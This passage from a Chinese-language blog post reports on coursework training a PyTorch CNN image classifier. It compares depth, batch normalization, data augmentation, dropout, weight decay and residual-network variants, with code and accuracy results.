class="number">1</span>)</span><br><span class="line">        <span class="comment">#找到预测分类的最大值的索引</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> test_label:</span><br><span class="line">            prediction.append(y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#把結果写入 csv </span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;predict.csv&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;Id,Category\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, y <span class="keyword">in</span>  <span class="built_in">enumerate</span>(prediction):</span><br><span class="line">        f.write(<span class="string">&#x27;&#123;&#125;,&#123;&#125;\n&#x27;</span>.<span class="built_in">format</span>(i, y))</span><br></pre></td></tr></table></figure>
<h3 id="4-结果分析与评估"><a href="#4-结果分析与评估" class="headerlink" title="4.结果分析与评估"></a>4.结果分析与评估</h3><h4 id="4-1-原始模型"><a href="#4-1-原始模型" class="headerlink" title="4.1 原始模型"></a>4.1 原始模型</h4><p>​    首先我们在CNN层数为10层(包括卷积层和池化层)的情况下进行训练，参数量统计信息如下所示，这里我们可以用torchsummary来对网络结构和参数进行统计。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torchsummary.summary(model, input_size, batch_size=-<span class="number">1</span>, device=<span class="string">&quot;cuda&quot;</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>model：pytorch 模型，必须继承自 nn.Module</li>
<li>input_size：模型输入 size，形状为 C，H ，W</li>
<li>batch_size：batch_size，默认为 -1，在展示模型每层输出的形状时显示的 batch_size</li>
<li>device：”cuda”或者”cpu”</li>
</ul>
</blockquote>
<p>​    下图为CNN神经网络的结构，并且可以从图中看出神经网络中的参数个数，我们可以先分析一下Conv2d-1层的参数量，可以看到共有1792个，其中在Conv2d-1层中，卷积核是$3\times3\times3$,共有64个filter，那么param的数量就是$3\times3\times3\times64+64$ 其中最后加入的64是偏置量。然后分析Conv2d-5，这里共有128个filter，输入深度是64的feature map，那么filter的深度也是64，那么param的数量就是$128\times3\times3\times64+128$,其中128是偏置量。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221122200209812.png" alt="image-20221122200209812"></p>
<p>​       在训练集上进行训练，epoch为30  ，可以看到第30轮的时候，在训练集上的准确率达到0.86，loss为0.003，但是在验证集上准确率只有0.64，loss为0.01。最终在训练集和验证集组合的训练集上训练，到第30轮准确率可以达到0.9，loss为0.002，可以看出该模型能在训练集上取得很好的训练效果，但是模型的泛化能力还需要增强。</p>
<p>​                                     <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221122201550255.png" alt="image-20221122201550255" style="zoom: 80%;" /></p>
<p>​                                               <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/7ICY@R%5$@3{HWXLAF8NCA8.png" alt="img"  /></p>
<p>​    使用原始版本的训练数据提交到ML2022springhw3的网站进行测试，测试结果基本在略高于0.75的水平</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221207193528808.png" alt="image-20221207193528808"></p>
<h4 id="4-2-减少CNN深度"><a href="#4-2-减少CNN深度" class="headerlink" title="4.2 减少CNN深度"></a>4.2 减少CNN深度</h4><p>​    这里我们在参数量大体不变的情况下，将CNN结构的层数减半，然后我们对模型进行训练，比较和原始模型训练的效果。下图是CNN结构层数减半后的模型和对应的参数量（这里我们控制了在CNN结构中参数量大致相同）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.cnn = nn.Sequential(</span><br><span class="line">    nn.Conv2d(in_channels=<span class="number">3</span>, out_channels=<span class="number">256</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">    nn.BatchNorm2d(<span class="number">256</span>),<span class="comment"># 归一化处理,参数是</span></span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(kernel_size =<span class="number">2</span>, stride=<span class="number">2</span>, padding=<span class="number">0</span>),   </span><br><span class="line">    <span class="comment">#由于padding了前后两列0，并且kernel大小为3，其实filter过滤后图片并无减小，减小只是在</span></span><br><span class="line">    <span class="comment">#maxpool池化，[256,64,64]64是filter，image-map</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    nn.Conv2d(<span class="number">256</span>,<span class="number">512</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">    <span class="comment">#[256,64,64]这里我们取128个卷积核</span></span><br><span class="line">    nn.BatchNorm2d(<span class="number">512</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>),</span><br><span class="line">    <span class="comment">#[512,32,32]</span></span><br><span class="line">    </span><br><span class="line">    nn.Conv2d(<span class="number">512</span>,<span class="number">512</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">    <span class="comment">#[512,32,32]这里我们取256个卷积核</span></span><br><span class="line">    nn.BatchNorm2d(<span class="number">512</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>),</span><br><span class="line">    <span class="comment">#[512,16,16]</span></span><br><span class="line">    </span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221122220256012.png" alt="image-20221122220256012" style="zoom:80%;" /></p>
<p>​    通过模型训练我们可以发现，经过30个epoch训练后，不仅每个epoch的训练时间增加，并且在训练结果上也不如原有的模型，可以看到最终在训练集上的准确率只有0.73，而在验证集上的准确率只有0.55,通过比较我们可以得出结论，在参数量大致相同的情况下，使用更深层的神经网络对模型的训练结果会更好。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221122220718914.png" alt="image-20221122220718914" style="zoom:89%;" /></p>
<h4 id="4-3-评估data-normalization的影响"><a href="#4-3-评估data-normalization的影响" class="headerlink" title="4.3 评估data normalization的影响"></a>4.3 评估data normalization的影响</h4><p>​    下面是评估模型加入normalization过程对模型训练结果的影响，在之前的训练中，我们在CNN神经网络中加入了nn.BatchNorm2d对训练数据进行归一化处理，在下面的训练过程中，我们将不加入归一化语句对模型进行训练来比较data normalization对模型训练的影响。</p>
<p>​    通过训练我们可以发现，经过30个epoch后，在训练集上的准确率为0.89，在验证集上的准确率为0.58，虽然在训练集上的准确率略高于normalization的版本，但是在验证集上的准确率却明显低于normalization的版本。                                                                          </p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221123012025406.png" alt="image-20221123012025406"></p>
<p>​    Batch Normalization，简称BatchNorm或BN，翻译为“批归一化”，是神经网络中一种特殊的层，目前常见的结构是：卷积+BN+激活函数。归一化的一个显著的作用就是能够减少梯度消失问题，因为BN能够通过一定的规范化手段将每层神经网络任意神经元的输入值强行拉回到均值为0方差为1的范围里面，这样就能将输入值落在非线性函数比较敏感的区域中，这样就能避免梯度消失的问题，并且梯度越大还能加快学习效率。但是由训练我们可以看出在使用ReLU函数的情况下效果并不十分明显，因为ReLU函数本身就存在防止梯度消失的作用。</p>
<p>​    但是这里能够看出归一化对于防止过拟合方面的作用，因为BN的使用使得每一个minibatch中的样本都被关联在了一起，因此同样一个样本的输出不再仅仅取决于样本本身，也取决于同属一个batch的其他样本，而每次网络都是随机取batch，能够防止在一定程度上过拟合。</p>
<p><a href="https://arxiv.org/pdf/1502.03167.pdf">1502.03167.pdf (arxiv.org)</a></p>
<h4 id="4-4-评估data-augmentation的影响"><a href="#4-4-评估data-augmentation的影响" class="headerlink" title="4.4 评估data augmentation的影响"></a>4.4 评估data augmentation的影响</h4><p>​    下面是评估data augmentation对实验结果的影响，在原始模型中我们使用了trainsform方法对数据进行data augmentation，transforms并不是直接扩充样本量，而是各种变换以一定的概率直接作用在原图片上，没有生成新样本，只不过在一次次的迭代过程中，各种随机变换随机发生，这样能使每一次epoch读进来的数据不同，从大数定理的角度相当于扩充了样本。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221123193435717.png" alt="image-20221123193435717"></p>
<p>​    经过了30个epoch的训练，我们可以从训练结果中看出，最终在Train set上的准确率达到了0.86，和原始模型相近，但在验证集上的准确率只达到了0.56，这里可以看到data augmentation在防止过拟合方面的作用，利用data augmentation，相当于增加了样本数据，能够让模型学到更好的学习泛化特征，从而能够减少过拟合现象。</p>
<h4 id="4-5-优化模型"><a href="#4-5-优化模型" class="headerlink" title="4.5 优化模型"></a>4.5 优化模型</h4><p>​    我们可以从训练数据中看到，最终经过30个epoch，在训练数据集上能够达到0.86的准确率，但在验证集上只能达到0.64。能够提升test集准确率的方法有如下几个方面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/20200217224221982.png" alt="img" style="zoom:67%;" /></p>
<p>​    首先early stopping也就是提前让模型停下，防止训练过度情况的发生，也就是即便training set上的loss一直变低，只要validation set上的loss值开始出现增长时，就要提前结束训练。</p>
<p>​    在我们的训练实作中，我们可以通过选择适合的epoch来实现。当然我们也可以在pytorch中采用自动化的方式完成early stopping，early stopping的定义代码具体如下，第一个参数是patience，这个是当有连续的patience个轮次数值没有继续下降，反而上升的时候结束训练的条件，这里我们使用验证集上的准确率进行参照。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">early_stopping = EarlyStopping(patience, verbose=<span class="literal">True</span>)	</span><br><span class="line">......</span><br><span class="line">early_stopping(valid_loss, model)</span><br><span class="line"><span class="comment"># 若满足 early stopping 要求</span></span><br><span class="line"><span class="keyword">if</span> early_stopping.early_stop:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Early stopping&quot;</span>)</span><br><span class="line">	<span class="comment"># 结束模型训练</span></span><br><span class="line">	<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>​    第二点是regularization正则化，正则化的原理是给系数一些constrain，让它们不至于过大,从而防止过拟合现象的发生。</p>
<blockquote>
<p>ps：过拟合的时候，拟合函数的系数往往非常大，为什么？如下图所示，过拟合，就是拟合函数需要顾忌每一个点，最终形成的拟合函数波动很大。在某些很小的区间里，函数值的变化很剧烈。这就意味着函数在某些小区间里的导数值（绝对值）非常大，由于自变量值可大可小，所以只有系数足够大，才能保证导数值很大</p>
</blockquote>
<p>​    这一点在我们的实作中，可以通过修改优化器函数的参数来进行实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.optim.Adam(params,lr,betas,eps,weight_decay)</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>params (iterable) – 待优化参数的iterable或者是定义了参数组的dict</li>
<li>lr (<code>float</code>, 可选) – 学习率（默认：1e-3）</li>
<li>betas (Tuple[<code>float</code>, <code>float</code>], 可选) – 用于计算梯度以及梯度平方的运行平均值的系数（默认：0.9，0.999）</li>
<li>eps (<code>float</code>, 可选) – 为了增加数值计算的稳定性而加到分母里的项（默认：1e-8）</li>
<li>weight_decay (<code>float</code>, 可选) – 权重衰减（L2惩罚）（默认: 0）</li>
</ul>
</blockquote>
<p>​    另外一点是在加入Dropout层，Dropout层是让每一个Neuron有p%的概率被丢掉，那么丢掉以后和这个Neuron相连的weight也没用了，但是在testing的阶段，就不再使用dropout。dropout的原理是能够通过随机拆除神经元，等于在不同的模型上进行训练，最后再按加权进行平均处理，这样不仅能训练的更快，而且通常能够有更好的训练结果，另外由于随机性的存在，所有weight基本上都能够训练的到。<a href="https://www.jianshu.com/p/21d4c64fb8b5">Dropout作用原理 - 简书 (jianshu.com)</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/2020021900205073.png" alt="img" style="zoom:67%;" /></p>
<p>​    在实作中可以通过加入dropout层实现</p>
<blockquote>
<p>CLASS torch.nn.Dropout(p=0.5, inplace=False)</p>
</blockquote>
<ul>
<li><strong>p</strong>：所有输入单元归零的概率，默认值是0.5</li>
<li><strong>inplace</strong>：表示是否进行覆盖运算。如果设置为True表示</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;# Model&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Classifier</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(Classifier, self).__init__()</span><br><span class="line">        <span class="comment"># torch.nn.Conv2d(in_channels, out_channels, kernel_size, stride, padding)</span></span><br><span class="line">        <span class="comment"># torch.nn.MaxPool2d(kernel_size, stride, padding)</span></span><br><span class="line">        <span class="comment"># input 維度 [3, 128, 128]</span></span><br><span class="line">        self.cnn = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">64</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>),  <span class="comment"># [64, 128, 128]</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">64</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>),      <span class="comment"># [64, 64, 64]</span></span><br><span class="line"></span><br><span class="line">            nn.Conv2d(<span class="number">64</span>, <span class="number">128</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>), <span class="comment"># [128, 64, 64]</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">128</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>),      <span class="comment"># [128, 32, 32]</span></span><br><span class="line"></span><br><span class="line">            nn.Conv2d(<span class="number">128</span>, <span class="number">256</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>), <span class="comment"># [256, 32, 32]</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">256</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>),      <span class="comment"># [256, 16, 16]</span></span><br><span class="line"></span><br><span class="line">            nn.Conv2d(<span class="number">256</span>, <span class="number">512</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>), <span class="comment"># [512, 16, 16]</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">512</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>),       <span class="comment"># [512, 8, 8]</span></span><br><span class="line">            </span><br><span class="line">            nn.Conv2d(<span class="number">512</span>, <span class="number">512</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>), <span class="comment"># [512, 8, 8]</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">512</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>),       <span class="comment"># [512, 4, 4]</span></span><br><span class="line">        )</span><br><span class="line">        self.fc = nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">512</span>*<span class="number">4</span>*<span class="number">4</span>, <span class="number">4096</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.Dropout(<span class="number">0.2</span>),</span><br><span class="line">            nn.Linear(<span class="number">4096</span>, <span class="number">2048</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.Dropout(<span class="number">0.2</span>),</span><br><span class="line">            nn.Linear(<span class="number">2048</span>, <span class="number">1024</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.Linear(<span class="number">1024</span>, <span class="number">512</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.Linear(<span class="number">512</span>, <span class="number">11</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        out = self.cnn(x)</span><br><span class="line">        out = out.view(out.size()[<span class="number">0</span>], -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> self.fc(out)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;# Training</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">使用 training set 训练，使用 validation set 找好的参数</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">model = Classifier().cuda()</span><br><span class="line">loss = nn.CrossEntropyLoss() <span class="comment"># 因為、为是 classification task，所以 loss 使用 CrossEntropyLoss</span></span><br><span class="line">optimizer = torch.optim.Adam(model.parameters(), lr=<span class="number">0.001</span>,weight_decay=<span class="number">1e-5</span>) <span class="comment"># optimizer 使用 Adam优化器</span></span><br><span class="line">num_epoch = <span class="number">70</span></span><br></pre></td></tr></table></figure>
<p>​    在加入了dropout层和正则化系数后，我们还加深了全连接网络的深度来获得更好的学习效果，可以从下面的训练情况中看出，在第30个epoch虽然训练集上的准确率只有0.73，但是验证集上的准确率已经达到了原始模型0.64的水准，说明了模型的泛化能力增强了，继续训练至60轮，在训练集上的准确率可达0.9，在验证集上也达到了0.70，但是在30轮之后，验证集上的准确率提升缓慢，说明模型已经达到了瓶颈，如果想达到更高，还需要进一步调整模型方案。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221124111932930.png" alt="image-20221124111932930" style="zoom:67%;" /></p>
<p>​    使用全部数据集对优化后的模型进行训练，尝试将数据集提交到ML2022hw3的网站进行测试，在epoch为70的情况下（训练时间在一个多小时），大概能够拿到80分左右的分数，相比于上面的原始模型还是有一定的提高的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221207193344296.png" alt="image-20221207193344296"></p>
<h3 id="5-进阶"><a href="#5-进阶" class="headerlink" title="5.进阶"></a>5.进阶</h3><h4 id="5-1-Residual-Implementation"><a href="#5-1-Residual-Implementation" class="headerlink" title="5.1 Residual Implementation"></a>5.1 Residual Implementation</h4><p>​    上面我尝试了使用多种方式优化模型，在网上读论文发现对图像分类问题，有一种更好的方式为残差神经网络。首先介绍为什么要引入残差神经网络，在相同的优化条件下，更深神经网络的训练效果更强是十分显然的，然而由于参数过多、模型复杂度更高，深层神经网络会出现十分严重的过拟合问题，即训练集与测试集准确度之间的gap过大。</p>
<p>​    </p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221206170824779.png" alt="image-20221206170824779"></p>
<p>​        有些情况下更深层的神经网络远不如一些浅的神经网络，另外还会出现梯度消失/梯度爆炸的问题，上图中，56层的神经网络相比于20层，新增加的36层是对神经网络的“恶化，由此一个想法自然而然的产生：如果这36层神经网络是恒等映射（identity mapping），那么56层的神经网络不就和20层的一样好了吗？</p>
<p>​    如果这36层神经网络相比于恒等映射再好上那么一点点（更接近最优函数），那么不就起到了正优化的作用了吗？ResNet的insight由此诞生。假设某一层内，最优函数记为 H(x) ，那么我们所拟合的目标函数 F(x) 定义为 F(x):=H(x)−x ，函数 F(x) 被称为“残差函数”。这一做法基于最优函数和线性函数具有较高的相似性，极端来看，权重层（weight layer）已经收敛不再更新任何参数，“网络退化”说明F(x)通道向着变坏的方向迭代，而添加的恒等映射（Identity）仅复制上一层的输出特征，一定程度上阻碍了更坏的情况发生。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/dcad4778d61d4248b5ae0d094e803627.png" alt="在这里插入图片描述"></p>
<h5 id="5-1-1-版本一"><a href="#5-1-1-版本一" class="headerlink" title="5.1.1 版本一"></a>5.1.1 版本一</h5><p>​    首先我根据李宏毅老师ppt上的方式简单实现了一下残差神经网络，由于中间存在一个identity，因此这里重点是有恒等映射反馈的层上我们采用的filter数目和输入的channel的数目相等，这样才能在输出结果上加入恒等映射。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221207194841075.png" alt="image-20221207194841075"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Residual_Network</span>(nn.Module):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="built_in">super</span>(Residual_Network, self).__init__()</span><br><span class="line">    </span><br><span class="line">    self.cnn_layer1 = nn.Sequential(</span><br><span class="line">        nn.Conv2d(<span class="number">3</span>, <span class="number">64</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">        nn.BatchNorm2d(<span class="number">64</span>),</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">#[64,128,128]</span></span><br><span class="line">    self.cnn_layer2 = nn.Sequential(</span><br><span class="line">        nn.Conv2d(<span class="number">64</span>, <span class="number">64</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">        nn.BatchNorm2d(<span class="number">64</span>),</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">#[64,128,128]</span></span><br><span class="line"></span><br><span class="line">    self.cnn_layer3 = nn.Sequential(</span><br><span class="line">        nn.Conv2d(<span class="number">64</span>, <span class="number">128</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>),</span><br><span class="line">        nn.BatchNorm2d(<span class="number">128</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    self.cnn_layer4 = nn.Sequential(</span><br><span class="line">        nn.Conv2d(<span class="number">128</span>, <span class="number">128</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">        nn.BatchNorm2d(<span class="number">128</span>),</span><br><span class="line">    )</span><br><span class="line">    self.cnn_layer5 = nn.Sequential(</span><br><span class="line">        nn.Conv2d(<span class="number">128</span>, <span class="number">256</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>),</span><br><span class="line">        nn.BatchNorm2d(<span class="number">256</span>),</span><br><span class="line">    )</span><br><span class="line">    self.cnn_layer6 = nn.Sequential(</span><br><span class="line">        nn.Conv2d(<span class="number">256</span>, <span class="number">256</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">        nn.BatchNorm2d(<span class="number">256</span>),</span><br><span class="line">    )</span><br><span class="line">    self.fc_layer = nn.Sequential(</span><br><span class="line">        nn.Linear(<span class="number">256</span>* <span class="number">32</span>* <span class="number">32</span>, <span class="number">256</span>),</span><br><span class="line">        nn.ReLU(),</span><br><span class="line">        nn.Linear(<span class="number">256</span>, <span class="number">11</span>)</span><br><span class="line">    )</span><br><span class="line">    self.relu = nn.ReLU()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">    <span class="comment"># input (x): [batch_size, 3, 128, 128]</span></span><br><span class="line">    <span class="comment"># output: [batch_size, 11]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Extract features by convolutional layers.</span></span><br><span class="line">    <span class="comment"># 第一层不做残差连接</span></span><br><span class="line">    x1 = self.cnn_layer1(x)</span><br><span class="line">    x1 = self.relu(x1)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第二层进行残差连接</span></span><br><span class="line">    Residual = x1 </span><br><span class="line">    x2 = self.cnn_layer2(x1)</span><br><span class="line">    <span class="comment"># 在通过激活函数之前进行残差连接</span></span><br><span class="line">    x2 = x2 + Residual</span><br><span class="line">    x2 = self.relu(x2)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第三层不进行残差连接</span></span><br><span class="line">    x3 = self.cnn_layer3(x2)</span><br><span class="line">    x3 = self.relu(x3)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第四层进行残差连接</span></span><br><span class="line">    Residual = x3</span><br><span class="line">    x4 = self.cnn_layer4(x3)</span><br><span class="line">    x4 = x4 + Residual</span><br><span class="line">    x4 = self.relu(x4)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第五层不进行残差连接</span></span><br><span class="line">    x5 = self.cnn_layer5(x4)</span><br><span class="line">    x5 = self.relu(x5)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第六层进行残差连接</span></span><br><span class="line">    Residual = x5</span><br><span class="line">    x6 = self.cnn_layer6(x5)</span><br><span class="line">    x6 = x6 + Residual</span><br><span class="line">    x6 = self.relu(x6)</span><br><span class="line">    <span class="comment"># The extracted feature map must be flatten before going to fully-connected layers.</span></span><br><span class="line">    xout = x6.flatten(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># The features are transformed by fully-connected layers to obtain the final logits.</span></span><br><span class="line">    xout = self.fc_layer(xout)</span><br><span class="line">    <span class="keyword">return</span> xout</span><br></pre></td></tr></table></figure>
<p>​    对这个残差神经网络进行测试，效果并不十分理想，可能是加入恒等映射的原因，一开始损失函数收敛的很慢，在100个epoch的训练情况下，准确率只能达到0.6，但是时间已经在3小时以上，模型的训练效率并不高。</p>
<h5 id="5-1-2-版本二"><a href="#5-1-2-版本二" class="headerlink" title="5.1.2 版本二"></a>5.1.2 版本二</h5><p>​    同时也尝试使用更加规范化的版本，通过先定义残差块，再堆叠残差块实现更加深层的残差神经网络，下面是训练60个epoch的具体效果，准确率能够达到0.7左右。</p>
<p>​    </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Residual_Block</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, ic, oc, stride=<span class="number">1</span></span>):</span><br><span class="line">        <span class="comment"># torch.nn.Conv2d(in_channels, out_channels, kernel_size, stride, padding)</span></span><br><span class="line">        <span class="comment"># torch.nn.MaxPool2d(kernel_size, stride, padding)</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.conv1 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(ic, oc, kernel_size=<span class="number">3</span>, stride=stride, padding=<span class="number">1</span>),</span><br><span class="line">            nn.BatchNorm2d(oc),</span><br><span class="line">            nn.ReLU(inplace=<span class="literal">True</span>)</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        self.conv2 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(oc, oc, kernel_size=<span class="number">3</span>, stride=<span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">            nn.BatchNorm2d(oc),</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        self.relu = nn.ReLU(inplace=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">        self.downsample = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> stride != <span class="number">1</span> <span class="keyword">or</span> (ic != oc):</span><br><span class="line">            self.downsample = nn.Sequential(</span><br><span class="line">                nn.Conv2d(ic, oc, kernel_size=<span class="number">1</span>, stride=stride),</span><br><span class="line">                nn.BatchNorm2d(oc),</span><br><span class="line">            )</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        residual = x</span><br><span class="line">        out = self.conv1(x)</span><br><span class="line">        out = self.conv2(out)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.downsample:</span><br><span class="line">            residual = self.downsample(x)</span><br><span class="line">            </span><br><span class="line">        out += residual</span><br><span class="line">        <span class="keyword">return</span> self.relu(out)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Classifier</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, block, num_layers, num_classes=<span class="number">11</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.preconv = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">32</span>, kernel_size=<span class="number">7</span>, stride=<span class="number">2</span>, padding=<span class="number">3</span>, bias=<span class="literal">False</span>),</span><br><span class="line">            nn.BatchNorm2d(<span class="number">32</span>),</span><br><span class="line">            nn.ReLU(inplace=<span class="literal">True</span>),</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        self.layer0 = self.make_residual(block, <span class="number">32</span>, <span class="number">64</span>,  num_layers[<span class="number">0</span>], stride=<span class="number">2</span>)</span><br><span class="line">        self.layer1 = self.make_residual(block, <span class="number">64</span>, <span class="number">128</span>, num_layers[<span class="number">1</span>], stride=<span class="number">2</span>)</span><br><span class="line">        self.layer2 = self.make_residual(block, <span class="number">128</span>, <span class="number">256</span>, num_layers[<span class="number">2</span>], stride=<span class="number">2</span>)</span><br><span class="line">        self.layer3 = self.make_residual(block, <span class="number">256</span>, <span class="number">512</span>, num_layers[<span class="number">3</span>], stride=<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#self.avgpool = nn.AvgPool2d(2)</span></span><br><span class="line">        </span><br><span class="line">        self.fc = nn.Sequential(            </span><br><span class="line">            nn.Dropout(<span class="number">0.4</span>),</span><br><span class="line">            nn.Linear(<span class="number">512</span>*<span class="number">4</span>*<span class="number">4</span>, <span class="number">512</span>),</span><br><span class="line">            nn.BatchNorm1d(<span class="number">512</span>),</span><br><span class="line">            nn.ReLU(inplace=<span class="literal">True</span>),</span><br><span class="line">            nn.Dropout(<span class="number">0.2</span>),</span><br><span class="line">            